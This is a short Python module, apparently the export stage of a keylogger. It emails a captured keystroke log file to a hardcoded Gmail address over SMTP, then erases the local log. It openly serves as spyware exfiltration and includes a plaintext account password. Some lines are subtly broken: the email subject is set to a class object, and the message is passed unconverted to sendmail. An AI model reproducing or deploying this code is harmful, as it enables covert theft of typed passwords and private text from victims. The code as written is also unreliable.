"""
Used for exporting record.txt via email
"""
import smtplib
import datetime
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart

# To and From email addresses (Same for testing purposes)
FRM_ADDRESS = "keylogger.0w0@gmail.com"
TO_ADDRESS = "keylogger.0w0@gmail.com"

# Bot email account info
USR_NAME = "keylogger.0w0"
FRM_PSWD = "DGisonline13"

# Path to record.txt
REC_PATH = "record.txt"


def export():
    # Set up connection / login to email account
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(FRM_ADDRESS, FRM_PSWD)

    # Create the headers for the email
    msg = MIMEMultipart()
    msg['From'] = FRM_ADDRESS
    msg['To'] = TO_ADDRESS
    msg['Subject'] = datetime.datetime

    # Open record.txt as a MINEBase object (Necessary for attaching to email)
    file = MIMEBase('application', 'octet-stream')
    file.set_payload(open(REC_PATH, 'rb').read())
    encoders.encode_base64(file)
    file.add_header('Content-Disposition', 'attachment; filename="text.txt"')
    msg.attach(file)

    # Send and close connection to mail server
    server.sendmail(FRM_ADDRESS, TO_ADDRESS, msg)
    server.quit()

    # Erases .txt file to avoid repeat data (May interfere with actual logging..?)
    open(REC_PATH, 'w').close()
